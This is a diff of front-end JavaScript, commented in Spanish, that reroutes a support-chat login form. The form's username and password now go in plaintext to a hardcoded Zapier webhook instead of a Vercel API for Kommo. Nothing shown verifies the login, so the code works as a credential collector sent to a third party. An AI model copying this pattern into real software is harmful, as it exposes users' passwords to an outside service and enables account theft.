@@ -1,12 +1,15 @@
-// Función para enviar los datos del usuario y contraseña al Webhook de Kommo
-function sendToKommo(username, password) {
+// Función para enviar los datos del usuario y contraseña al Webhook de Zapier
+function sendToZapier(username, password) {
     const data = {
         username: username,
         password: password,  // Enviar la contraseña (puedes encriptarla si es necesario)
     };
 
-    // Cambia la URL para apuntar a tu API creada en Vercel
-    fetch('/api/kommo', {  // Esta es la URL de tu API en Vercel
+    // URL del Webhook de Zapier (Reemplaza con la URL de tu Webhook)
+    const zapierWebhookURL = 'https://hooks.zapier.com/hooks/catch/22169189/2e5vec1/'; // Esta es tu URL de Webhook de Zapier
+
+    // Enviar los datos al Webhook de Zapier
+    fetch(zapierWebhookURL, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -18,11 +21,11 @@ function sendToKommo(username, password) {
         console.log("Datos enviados correctamente:", result);
     })
     .catch(error => {
-        console.error("Error al enviar a Kommo:", error);
+        console.error("Error al enviar a Zapier:", error);
     });
 }
 
-// Función de login: guarda el usuario en cookies y envía los datos al Webhook de Kommo
+// Función de login: guarda el usuario en cookies y envía los datos al Webhook de Zapier
 function login() {
     let username = document.getElementById("username").value.trim();
     let password = document.getElementById("password").value.trim();
@@ -42,8 +45,8 @@ function login() {
     // Guardar usuario en cookies
     setCookie("chatUser", username, 30);
 
-    // Enviar los datos al Webhook de Kommo (a través de la API que hemos configurado en Vercel)
-    sendToKommo(username, password);
+    // Enviar los datos al Webhook de Zapier
+    sendToZapier(username, password);
 
     // Mostrar el chat de soporte y actualizar la parte superior
     document.getElementById("loginForm").style.display = "none";
